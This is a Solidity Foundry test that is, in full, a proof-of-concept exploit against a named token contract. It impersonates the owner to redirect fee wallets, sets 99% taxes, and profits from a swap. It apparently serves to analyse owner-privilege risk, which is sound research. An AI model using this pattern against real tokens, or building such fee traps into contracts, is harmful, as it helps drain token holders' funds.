import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface TokenTool {
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function uniswapPair() external view returns (address);
    function owner() external view returns (address);
    function setMarketingWalletAddress(address payable _addr) external;
    function setTeamWalletAddress(address payable _addr) external;
    function setBuyTaxes(uint256 _marketing, uint256 _team, uint256 _liquidity) external;
    function setSelTaxes(uint256 _marketing, uint256 _team, uint256 _liquidity) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker;

    TokenTool token;
    IUniswapV2Router02 router;
    address owner;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        token = TokenTool(TARGET);
        router = token.uniswapV2Router();
        address pair = token.uniswapPair();
        owner = token.owner();
        vm.label(TARGET, "Victim Token");
        vm.label(pair, "Uniswap Pair");
        vm.label(address(router), "Uniswap Router");
        vm.label(owner, "Contract Owner");
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial attacker balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Impersonate owner and redirect wallet addresses to attacker
        vm.startPrank(owner);
        token.setMarketingWalletAddress(payable(address(this)));
        token.setTeamWalletAddress(payable(address(this)));

        // Step 2: Set excessive taxes (99% total)
        token.setBuyTaxes(33, 33, 33);  // 99% buy tax
        token.setSelTaxes(33, 33, 33);  // 99% sell tax
        vm.stopPrank();

        // Step 3: Inject tokens to simulate user sell
        deal(address(token), address(this), 100000 * 1e18);

        // Step 4: Approve router to spend tokens
        token.approve(address(router), type(uint256).max);

        // Step 5: Execute swap - this will trigger fee collection
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = router.WETH();

        // Swap tokens for ETH - the 99% fee will be collected
        uint256 swapAmount = 100000 * 1e18;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            swapAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 6: Verify profit - attacker balance should have increased from fee distribution
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have profited from excessive fees");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

